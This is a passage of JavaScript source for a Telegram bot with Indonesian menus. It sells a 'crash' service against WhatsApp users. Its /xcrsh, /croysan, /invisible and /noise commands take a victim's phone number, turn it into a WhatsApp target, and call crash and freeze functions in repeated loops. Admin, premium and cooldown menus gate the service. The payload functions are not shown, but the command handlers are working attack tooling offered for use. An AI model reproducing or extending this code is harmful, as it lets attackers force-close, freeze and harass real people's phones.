    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝙰𝚍𝚖𝚒𝚗 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /addadmin - Add Admin\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /deladmin - Delete Admin\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /setcd - Set Cooldown\n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /addprem - Add Premium\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /delprem - Delete Premium\n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝙸𝚗𝚏𝚘 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /addpremgrup - Add Premium Group\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /delpremgrup - Delete Premium Group\n" +
    "<blockquote><pre>⬡═―—⊱ 𝚂𝚝𝚊𝚝𝚞𝚜 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /blockcmd - Blokir Command\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /unblockcmd - Buka Blokir Command\n" +
    "<blockquote><pre>⬡═―•——⊱ 𝙸𝚗𝚏𝚘 𝙱𝚞𝚝𝚝𝚘𝚗 ⊰——•―═⬡</pre></blockquote>";

  var keyboard = [
    [
      {
        text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸",
        callback_data: "/start",
        style: color,
        icon_custom_emoji_id: "5787546290527145353"
      }
    ]
  ];

  try {
    await ctx.editMessageCaption(controlsMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
  } catch (error) {
    var description =
      error && error.response && typeof error.response.description === "string"
        ? error.response.description
        : "";

    if (description.includes("message is not modified")) {
      return ctx.answerCbQuery();
    }

    console.error("Error di controls menu:", error);
    try {
      await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
    } catch (_) {}
  }
});

bot.action("/bug", async function (ctx) {
  logCommand(ctx, "/bug");

  var color = getRandomColor();

  var bugMenu =
    "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙾𝚠𝚗𝚎𝚛 : @bixuec <tg-emoji emoji-id=\"5778220576497735613\">🌹</tg-emoji>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚅𝚎𝚛𝚜𝚒 : 𝟹.𝟶.𝟶 𝚅𝚒𝚙\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙿𝚛𝚎𝚏𝚒𝚡 : ( / )\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝙱𝚊𝚑𝚊𝚜𝚊 : JavaScript\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> 𝚃𝚒𝚙𝚎 𝚂𝚎𝚗𝚍𝚎𝚛 : Bebas Spam\n" +
    "<blockquote><pre>𝙱𝚞𝚐 𝙼𝚎𝚗𝚞</pre></blockquote>\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /xcrsh - Force close not work all device\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /croysan - Crash Infinity \n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /invisible - delay X freeze invisible hard\n" +
    "<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> /noise - Blank New Beta";

  var keyboard = [
    [
      {
        text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸",
        callback_data: "/start",
        style: color,
        icon_custom_emoji_id: "5787546290527145353"
      }
    ]
  ];

  try {
    await ctx.editMessageCaption(bugMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
  } catch (error) {
    var description =
      error && error.response && typeof error.response.description === "string"
        ? error.response.description
        : "";

    if (description.includes("message is not modified")) {
      return ctx.answerCbQuery();
    }

    console.error("Error di bug menu:", error);
    try {
      await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
    } catch (_) {}
  }
});

bot.command("xcrsh", checkWhatsAppConnection, checkPremium, checkCooldown, async function (ctx) {
  var color, q, target, mention, processMessage, processMessageId, i;
  logCommand(ctx, "/xcrsh");
  color = getRandomColor();
  q = ctx.message.text.split(" ")[1];
  if (!q) {
    return ctx.reply("🪧  Format: /xcrsh 62×××");
  }
  target = q.replace(new RegExp("[^0-9]", "g"), "") + "@s.whatsapp.net";
  mention = false;
  processMessage = await ctx.telegram.sendMessage(ctx.chat.id, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Location Crash\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing...\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
  processMessageId = processMessage.message_id;
  i = 0;
  while (i < 5) {
    await EclipsV(sock, target);
    await wsnu(sock, target);
    i = i + 1;
  }
  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Location Crash\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing Success\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
});

bot.command("invisible", checkWhatsAppConnection, checkPremium, checkCooldown, async function (ctx) {
  var color, q, target, mention, processMessage, processMessageId, i;
  logCommand(ctx, "/invisible");
  color = getRandomColor();
  q = ctx.message.text.split(" ")[1];
  if (!q) {
    return ctx.reply("🪧  Format: /invisible 62×××");
  }
  target = q.replace(new RegExp("[^0-9]", "g"), "") + "@s.whatsapp.net";
  mention = false;
  processMessage = await ctx.telegram.sendMessage(ctx.chat.id, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Delay Invisible\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing...\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
  processMessageId = processMessage.message_id;
  i = 0;
  while (i < 5) {
    await wsnuV4(sock, target);
    await wsnuV4(sock, target);
    i = i + 1;
  }
  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Delay Invisible\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing Success\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
});

bot.command("croysan", checkWhatsAppConnection, checkPremium, checkCooldown, async function (ctx) {
  var color, q, target, mention, processMessage, processMessageId, i;
  logCommand(ctx, "/croysan");
  color = getRandomColor();
  q = ctx.message.text.split(" ")[1];
  if (!q) {
    return ctx.reply("🪧 Format: /croysan 62×××");
  }
  target = q.replace(new RegExp("[^0-9]", "g"), "") + "@s.whatsapp.net";
  mention = false;
  processMessage = await ctx.telegram.sendMessage(ctx.chat.id, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Delay Invisible\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing...\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
  processMessageId = processMessage.message_id;
  i = 0;
  while (i < 5) {
    await CrashHomeNew(target);
    await CrashHomeNew(target);
    i = i + 1;
  }
  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Delay Invisible\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing Success\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
});

bot.command("noise", checkWhatsAppConnection, checkPremium, checkCooldown, async function (ctx) {
  var color, q, target, mention, processMessage, processMessageId, i;
  logCommand(ctx, "/noise");
  color = getRandomColor();
  q = ctx.message.text.split(" ")[1];
  if (!q) {
    return ctx.reply("🪧 Format: /noise 62×××");
  }
  target = q.replace(new RegExp("[^0-9]", "g"), "") + "@s.whatsapp.net";
  mention = false;
  processMessage = await ctx.telegram.sendMessage(ctx.chat.id, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Delay Invisible\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing...\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
  processMessageId = processMessage.message_id;
  i = 0;
  while (i < 10) {
    await tengkorak(sock, target);
    await tengkorak(sock, target);
    i = i + 1;
  }
  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, "\n<blockquote><pre>⬡═―—⊱ ⎧ 𝚃𝙴𝙽𝙶𝙺𝙾𝚁𝙰𝙺𝚇𝟽 𝙲𝚁𝙰𝚂𝙷 ⎭ ⊰―—═⬡\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Target : " + String(q) + "\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Type : Delay Invisible\n<tg-emoji emoji-id=\"5260450573768990626\">➡️</tg-emoji> Status : Executing Success\n╘═——————————————═⬡</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭",
        url: "https://wa.me/" + String(q),
        style: color,
        icon_custom_emoji_id: "5334998226636390258"
      }]]
    }
  });
});

bot.launch();